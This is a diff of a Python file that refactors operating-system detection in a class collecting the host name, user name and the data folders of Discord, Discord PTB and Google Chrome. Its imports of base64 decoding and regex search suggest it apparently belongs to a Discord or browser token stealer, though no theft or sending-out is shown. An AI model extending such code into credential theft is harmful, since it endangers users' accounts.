@@ -1,7 +1,7 @@
 import os
 import ssl
 from platform import node as get_pc_name
-from sys import platform
+from sys import platform as OS
 from getpass import getuser
 from re import findall
 from base64 import b64decode
@@ -43,23 +43,12 @@ class Computer():
         self.name: str = get_pc_name().split(".")[0] if get_pc_name().find('.') else get_pc_name()
         self.username: str = getuser()
 
-    def check_os(self) -> str:
-        if platform == "linux" or platform == "linux2":
-            OS = "Linux"
-        elif platform == "darwin":
-            OS = "OSX"
-        elif platform == "win32":
-            OS = "Windows"
-        else:
-            OS = "Undefined"
-        return OS
-
     def get_paths(self) -> dict:
-        if self.check_os() == "Windows":
+        if OS == "win32":  # Windows
             LOCAL = os.getenv("LOCALAPPDATA")
             ROAMING = os.getenv("APPDATA")
 
-        if self.check_os() == "OSX":
+        if OS == "darwin":  # OSX
             LOCAL = os.path.expanduser("~/Library/Application Support")
             ROAMING = os.path.expanduser("~/Library/Application Support")
 
@@ -69,7 +58,7 @@ class Computer():
             "Discord PTB": os.path.join(ROAMING, "discordptb"),
         }
 
-        if self.check_os() == "Windows":
+        if OS == "win32":  # Windows
             PATHS.update({
                 "Google Chrome": os.path.join(LOCAL,
                                               "Google",
